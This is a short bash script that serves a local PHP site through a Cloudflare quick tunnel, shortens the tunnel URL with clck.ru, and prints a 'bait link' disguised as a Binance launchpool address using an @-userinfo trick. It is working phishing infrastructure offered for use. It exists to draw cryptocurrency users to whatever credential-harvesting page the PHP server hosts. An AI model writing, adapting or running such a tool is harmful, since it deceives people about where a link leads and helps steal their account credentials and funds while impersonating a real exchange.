#!/bin/bash

# Function to clean up background processes on exit
cleanup() {
    echo -e "\n[!] Stopping PHP server and Cloudflare tunnel..."
    pkill -f "php -S 127.0.0.1:3333" >/dev/null 2>&1
    pkill -f "cloudflared tunnel --url http://127.0.0.1:3333" >/dev/null 2>&1
    rm -f cloudlog.txt  # Optional: Remove log file
    exit 0
}

# Trap Ctrl+C (SIGINT) and call cleanup()
trap cleanup INT

echo "[+] Starting local PHP server on port 3333"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2

echo "[+] developed by KOLEUL..."

# Start cloudflared in background and log output
cloudflared tunnel --url http://127.0.0.1:3333 > cloudlog.txt 2>&1 &

# Wait until cloudflare gives us the URL
echo "[+] Waiting for Cloudflare tunnel link..."
while true; do
    link=$(grep -oP 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' cloudlog.txt | head -n 1)
    if [[ -n "$link" ]]; then
        break
    fi
    sleep 1
done

echo -e "\n[+] Original Cloudflare Link: $link"

# Shorten using clck.ru
short=$(curl -s -G --data-urlencode "url=$link" "https://clck.ru/--")

if [[ -n "$short" ]]; then
    bait="https://binance.com-launchpool@${short#https://}"
    echo "[+] Shortened Link (clck.ru): $short"
    echo "[🔥] Bait Link: $bait"
else
    echo "[-] Failed to shorten link with clck.ru"
fi

# Keep script running until Ctrl+C
while true; do sleep 1; done
